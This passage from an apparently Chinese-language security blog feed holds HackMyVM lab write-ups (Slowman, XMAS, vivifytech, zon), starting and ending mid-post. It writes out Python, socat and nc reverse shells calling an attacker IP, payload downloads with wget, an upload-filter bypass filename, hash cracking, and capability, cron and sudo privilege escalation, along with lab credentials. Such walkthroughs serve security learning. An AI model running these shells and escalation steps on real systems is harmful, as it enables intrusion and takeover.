</span></span></code></pre></div><p>没出来, 吐了, 每分钟八次. 太慢了. 看 wp 算了
假装枚举出来了

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_3.png" alt="HMM_slowman_image_3" /><figcaption>HMM_slowman_image_3</figcaption></figure>


</p>
<h2 id="枚举-mysql-信息">枚举 mysql 信息</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_4.png" alt="HMM_slowman_image_4" /><figcaption>HMM_slowman_image_4</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | gonzalo     tH1sS2stH3g0nz4l0pAsSWW0rDD!! 
</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | $SECRETLOGINURL /secretLOGIN/login.html  
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_5.png" alt="HMM_slowman_image_5" /><figcaption>HMM_slowman_image_5</figcaption></figure>


</p>
<h2 id="web-枚举">web 枚举</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_6.png" alt="HMM_slowman_image_6" /><figcaption>HMM_slowman_image_6</figcaption></figure>



进入之前 mysql 中发现的隐藏目录, 使用发现的用户名密码登录, 后面发现这个也能登录 ssh

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_7.png" alt="HMM_slowman_image_7" /><figcaption>HMM_slowman_image_7</figcaption></figure>



进去之后有个压缩包, 有密码
使用 john

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_8.png" alt="HMM_slowman_image_8" /><figcaption>HMM_slowman_image_8</figcaption></figure>



解压之后是一个账号和密码, 猜测是 ssh 的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>----------
</span></span><span style="display:flex;"><span>$USERS: trainerjean
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq 
</span></span><span style="display:flex;"><span>---------- 
</span></span></code></pre></div><p>使用 hashcat 解密一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hhh /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq:tweety1
</span></span></code></pre></div><h2 id="user_trainerjean">USER_trainerjean</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_9.png" alt="HMM_slowman_image_9" /><figcaption>HMM_slowman_image_9</figcaption></figure>



在 trainjean 的目录下面发现了这个 python 代码,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>trainerjean@slowman:~$ cat .python_history
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;bash&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>os.setid<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>os.setuid<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>exit
</span></span></code></pre></div><h2 id="user_root">USER_root</h2>
<p>尝试提权
上传 linpeas 和 pspy64, 后者没有发现什么

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_10.png" alt="HMM_slowman_image_10" /><figcaption>HMM_slowman_image_10</figcaption></figure>



没有注意 Capabilities 文件的信息.. 错过了
使用命令查找 Capabilities 文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/python3.10 cap_setuid<span style="color:#f92672">=</span>ep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/python3.10 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_11.png" alt="HMM_slowman_image_11" /><figcaption>HMM_slowman_image_11</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[XMAS]]></title><link href="https://l1uyun.one/posts/hmm_xmas/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmm_xmas/</id>
            
            <published>2024-02-14T17:08:44+08:00</published>
            <updated>2024-11-24T19:23:10+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="靶机-启动">靶机, 启动</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_1.png" alt="HMM_XMAS_image_1" /><figcaption>HMM_XMAS_image_1</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_2.png" alt="HMM_XMAS_image_2" /><figcaption>HMM_XMAS_image_2</figcaption></figure>


</p>
<h2 id="web-服务">web 服务</h2>
<p>目录扫描</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_3.png" alt="HMM_XMAS_image_3" /><figcaption>HMM_XMAS_image_3</figcaption></figure>


</p>
<p>在主页的下面发现了一个上传点, 直接上传反弹 shell</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_4.png" alt="HMM_XMAS_image_4" /><figcaption>HMM_XMAS_image_4</figcaption></figure>


</p>
<p>使用 nc 失败, 换成了 webshell</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_5.png" alt="HMM_XMAS_image_5" /><figcaption>HMM_XMAS_image_5</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_6.png" alt="HMM_XMAS_image_6" /><figcaption>HMM_XMAS_image_6</figcaption></figure>



然后还是用了 meterpreter</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
</span></span></code></pre></div><h2 id="www-data-进一步收集信息">www-data ,进一步收集信息</h2>
<p>/home/alabaster/nice_list. txt</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_7.png" alt="HMM_XMAS_image_7" /><figcaption>HMM_XMAS_image_7</figcaption></figure>


</p>
<p>这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_8.png" alt="HMM_XMAS_image_8" /><figcaption>HMM_XMAS_image_8</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39;</span> &gt; nice_or_naughty.py
</span></span></code></pre></div><p>又是这样子不稳定的 shell</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_9.png" alt="HMM_XMAS_image_9" /><figcaption>HMM_XMAS_image_9</figcaption></figure>


</p>
<p>上传一个 socat 二进制文件上去算了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/socat&#34;, &#34;TCP:192.168.10.11:4445&#34;, &#34;EXEC:/bin/bash,pty,stderr,setsid,sigint,sane&#34;])&#39;</span> &gt; nice_or_naughty.py
</span></span></code></pre></div><p>还是不行</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_10.png" alt="HMM_XMAS_image_10" /><figcaption>HMM_XMAS_image_10</figcaption></figure>


</p>
<h2 id="user-alabaster">User-alabaster</h2>
<p>巨魔大佬 nb</p>
<p>又学到一个工具 pwncat

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_11.png" alt="HMM_XMAS_image_11" /><figcaption>HMM_XMAS_image_11</figcaption></figure>


</p>
<h2 id="提权_sudo-执行-jar">提权_sudo 执行 jar</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_12.png" alt="HMM_XMAS_image_12" /><figcaption>HMM_XMAS_image_12</figcaption></figure>


</p>
<p>利用 sudo 涉及的文件可写, 用 gpt 生成了个 java 的反弹 shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## 编译成java字节码</span>
</span></span><span style="display:flex;"><span>javac ReverseShell.java
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## JAR文件需要一个清单文件（Manifest），这个文件指定了JAR的主类（包含main方法的类）。主类是当JAR文件被执行时首先加载的类。</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;Main-Class: ReverseShell&#39;</span> &gt; Manifest.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## 使用jar命令和上面创建的清单文件将编译后的.class文件打包成一个JAR文件。命令格式如下：</span>
</span></span><span style="display:flex;"><span>jar cfm ReverseShell.jar Manifest.txt ReverseShell.class
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_13.png" alt="HMM_XMAS_image_13" /><figcaption>HMM_XMAS_image_13</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /tmp 
</span></span><span style="display:flex;"><span>wget http://192.168.10.11:8000/ReverseShell.jar
</span></span><span style="display:flex;"><span>cp ReverseShell.jar /home/alabaster/PublishList/PublishList.jar
</span></span><span style="display:flex;"><span>sudo -u root /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_14.png" alt="HMM_XMAS_image_14" /><figcaption>HMM_XMAS_image_14</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_15.png" alt="HMM_XMAS_image_15" /><figcaption>HMM_XMAS_image_15</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[vivifytech]]></title><link href="https://l1uyun.one/posts/hmm_vivifytech/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmm_vivifytech/</id>
            
            <published>2024-02-13T12:46:25+08:00</published>
            <updated>2024-11-24T19:07:49+08:00</updated>
            
            
            <content type="html"><![CDATA[<p>192.168.10.12</p>
<h2 id="端口扫描">端口扫描</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_1.png" alt="HMM_vivifytech_image_1" /><figcaption>HMM_vivifytech_image_1</figcaption></figure>


</p>
<h2 id="web目录扫描">web目录扫描</h2>
<p>进一步扫描 WordPress 下的目录</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_2.png" alt="HMM_vivifytech_image_2" /><figcaption>HMM_vivifytech_image_2</figcaption></figure>


</p>
<p>发现敏感文件 secret. txt,</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_3.png" alt="HMM_vivifytech_image_3" /><figcaption>HMM_vivifytech_image_3</figcaption></figure>


</p>
<h2 id="根据收集的用户名-密码爆破-ssh">根据收集的用户名, 密码爆破 ssh</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_4.png" alt="HMM_vivifytech_image_4" /><figcaption>HMM_vivifytech_image_4</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_5.png" alt="HMM_vivifytech_image_5|400" /><figcaption>HMM_vivifytech_image_5|400</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_6.png" alt="HMM_vivifytech_image_6" /><figcaption>HMM_vivifytech_image_6</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_7.png" alt="HMM_vivifytech_image_7" /><figcaption>HMM_vivifytech_image_7</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah:bohicon
</span></span></code></pre></div><h2 id="user-txt-pwd">USER. txt PWD</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_8.png" alt="HMM_vivifytech_image_8" /><figcaption>HMM_vivifytech_image_8</figcaption></figure>


</p>
<h2 id="收集泄露信息横向移动">收集泄露信息,横向移动</h2>
<p>jresig secret

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_9.png" alt="HMM_vivifytech_image_9" /><figcaption>HMM_vivifytech_image_9</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_10.png" alt="HMM_vivifytech_image_10" /><figcaption>HMM_vivifytech_image_10</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.gnupg/crls.d$ cat DIR.txt
</span></span><span style="display:flex;"><span>v:1:
</span></span></code></pre></div><p>在用户目录里面发现了 TASK. txt 文件
下次应该直接全局找一下. txt 文件</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_11.png" alt="HMM_vivifytech_image_11" /><figcaption>HMM_vivifytech_image_11</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.private$ cat Tasks.txt
</span></span><span style="display:flex;"><span>- Change the Design and architecture of the website
</span></span><span style="display:flex;"><span>- Plan <span style="color:#66d9ef">for</span> an audit, it seems like our website is vulnerable
</span></span><span style="display:flex;"><span>- Remind the team we need to schedule a party before going to holidays
</span></span><span style="display:flex;"><span>- Give this cred to the new intern <span style="color:#66d9ef">for</span> some tasks assigned to him - gbodja:4Tch055ouy370N
</span></span></code></pre></div><h2 id="利用-sudo-git-提权">利用 sudo git 提权</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_12.png" alt="HMM_vivifytech_image_12" /><figcaption>HMM_vivifytech_image_12</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_13.png" alt="HMM_vivifytech_image_13" /><figcaption>HMM_vivifytech_image_13</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_14.png" alt="HMM_vivifytech_image_14" /><figcaption>HMM_vivifytech_image_14</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[zon]]></title><link href="https://l1uyun.one/posts/hmv_zon/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_zon/</id>
            
            <published>2024-02-11T10:52:40+08:00</published>
            <updated>2024-11-24T19:13:11+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="启动机器">启动机器</h2>
<p>得指定网络接口</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo arp-scan -I eth5 -l
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_1.png" alt="HMM_zon_image_1" /><figcaption>HMM_zon_image_1</figcaption></figure>


</p>
<h2 id="端口扫描">端口扫描</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo rustscan -a 192.168.10.13 -r 1-65535 -t <span style="color:#ae81ff">8000</span> --ulimit <span style="color:#ae81ff">5000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo nmap 192.168.10.13 -sT -Pn -p22,80 -sV -sC -O -oN portscan/norm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo nmap 192.168.10.13 -sT -Pn -p22,80 --script<span style="color:#f92672">=</span>vuln -oN portscan/vuln
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_2.png" alt="HMM_zon_image_2" /><figcaption>HMM_zon_image_2</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_3.png" alt="HMM_zon_image_3" /><figcaption>HMM_zon_image_3</figcaption></figure>


</p>
<h2 id="利用空格绕过文件上传过滤">利用空格绕过文件上传过滤</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_4.png" alt="HMM_zon_image_4" /><figcaption>HMM_zon_image_4</figcaption></figure>


</p>
<p>测试之后是检查文件名, 而不是文件头, 而且图片马不能正常解析

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_5.png" alt="HMM_zon_image_5|750" /><figcaption>HMM_zon_image_5|750</figcaption></figure>


</p>
<ul>
<li>
<p>非 jpeg 格式的无法上传

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_6.png" alt="HMM_zon_image_6" /><figcaption>HMM_zon_image_6</figcaption></figure>


</p>
</li>
<li>
<p>jpeg 格式能够正常上传

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_7.png" alt="HMM_zon_image_7" /><figcaption>HMM_zon_image_7</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_8.png" alt="HMM_zon_image_8" /><figcaption>HMM_zon_image_8</figcaption></figure>



后面尝试了图片马, 但是没有正常解析, 无法执行命令</p>
</li>
</ul>
<p>使用空格绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;webshell.jpeg .php&#34;</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_9.png" alt="HMM_zon_image_9" /><figcaption>HMM_zon_image_9</figcaption></figure>


</p>
<p>一句话木马, 获得 webshell

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_10.png" alt="HMM_zon_image_10" /><figcaption>HMM_zon_image_10</figcaption></figure>



freddie</p>
<h2 id="webshell">webshell</h2>
<p>上传一个反向 shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/php-reverse-shell.php -O /tmp/shell.php
</span></span></code></pre></div><p>吐了, 不清楚为啥反向 shell, 不稳定, 执行不了命令, 使用 nohup 也没有稳定下来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup nc -e /bin/sh 192.168.10.11 <span style="color:#ae81ff">1234</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_11.png" alt="HMM_zon_image_11|650" /><figcaption>HMM_zon_image_11|650</figcaption></figure>


</p>
<h2 id="利用脚本中泄露的mysql密码">利用脚本中泄露的mysql密码</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># script that checks the database&#39;s integrity every minute</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dump<span style="color:#f92672">=</span>/dev/shm/dump.sql
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">=</span>/var/log/db_integrity_check.log
</span></span><span style="display:flex;"><span>true &gt; <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>log<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/mysqldump -u admin -pudgrJbFc6Av#U3 admin credentials &gt; <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dump<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>/usr/bin/sed -i <span style="color:#e6db74">&#39;$d&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dump<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hash<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a&#34;</span>
</span></span><span style="display:flex;"><span>check_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>sha256sum <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dump<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>check_hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>  /usr/bin/wall <span style="color:#e6db74">&#34;Alert ! Database hacked !&#34;</span>
</span></span><span style="display:flex;"><span>  /usr/bin/du -sh /var/lib/mysql &gt;&gt; <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>log<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  /usr/bin/vmstat <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">3</span> &gt;&gt; <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>log<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  /usr/bin/sync <span style="color:#f92672">&amp;&amp;</span> /usr/bin/echo <span style="color:#ae81ff">3</span> &gt; /proc/sys/vm/drop_caches
</span></span><span style="display:flex;"><span>  /usr/bin/echo <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>date<span style="color:#66d9ef">)</span><span style="color:#e6db74"> : Integrity check completed for </span><span style="color:#e6db74">${</span>dump<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>log<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>最后使用 meterpreter 的这个更高级的 shell 成功了

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_12.png" alt="HMM_zon_image_12" /><figcaption>HMM_zon_image_12</figcaption></figure>


</p>
<h2 id="user-txt-pwd">user. txt PWD</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Freddie  | LDVK@dYiEa2I1lnjrEeoMif 
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_13.png" alt="HMM_zon_image_13" /><figcaption>HMM_zon_image_13</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh freddie@192.168.10.11
